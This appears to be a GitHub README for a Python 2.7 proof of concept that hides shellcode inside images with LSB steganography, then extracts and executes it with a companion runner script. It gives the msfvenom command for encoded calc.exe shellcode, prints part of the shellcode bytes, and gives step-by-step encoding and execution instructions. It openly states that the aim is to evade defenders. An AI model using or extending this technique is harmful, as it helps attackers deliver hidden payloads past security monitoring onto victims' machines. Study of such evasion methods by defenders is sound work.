# PyStegMalz
Python 2.7 script that uses LSB steganography to host your shellcode payloads from within a image, and a corresponding script to decode & execute the shellcode. This was a POC created as an pure experiement with defence-evasion not being the focus. However, this project will be updated continously to improve OPSEC & hopefully be a technqiue to evade the blue-team!

There are two scripts: 
`encoder.py` & `shellcode_runner.py`
For a very detailed explanation of this POC pleases check out my corresponding blog post:

https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/

## Instructions for use
### Generating shellcode.
For this POC I'll generate a simple calc.exe pop-up. Let's generate the corresponding shellcode in msfvenom:

`msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -i 5 -f py`

The shellcode generated will look something like this (this precise shellcode can be found in this repo as `shellcode.txt`):

```
buf += b"\xbd\xa9\x52\xa3\x17\xd9\xce\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x4c\x31\x6a\x13\x83\xc2\x04\x03\x6a"
buf += b"\xa6\xb0\x56\xad\x86\x76\x86\xf8\x2c\xab\x61\x88"
....
buf += b"\x86\x89\x46\x40\x19\x43\x18\xb6\x93\x1a\xd9\xc6"
buf += b"\x6b\xbc\xfb\xd9\xc2\x64\x05\xee\x36\x3a\x50\x88"
buf += b"\x26\x0d\x0c\xed\x7f\x35\x1b\xf5\xf3\xfe\xca\xec"
buf += b"\xe0\x90\x46\xf3"
```
Copy the contents of the shellcode, like above, into a text file and save it!
### Picking an image

For this part you can be creative, choose a fairly large image to ensure there is enough space to encode your shellcode. Save this to the same directory you put your shellcode text file in. 

If you are just playing around with this, `example.png` from this repo works well!

### Encoding

`encoder.py -s shellcode.txt -i example.png`

Expected output should be: 'Payload encoded and image saved to: poc_example.png'

However, if you recieve: 'Data too large for the image.' -> Choose a larger image!

You can view this payload encoded image and you'll barely notice a change between the two.

### POC demo

https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/#poc-live-demo

## Execution

Execution should be simple, just edit the `encoded_image_path` variable in the `shellcode_runner.py` script to be the filename (or path), in my case `poc_example.png` and execute the script! You should see a calc.exe pop-up :)
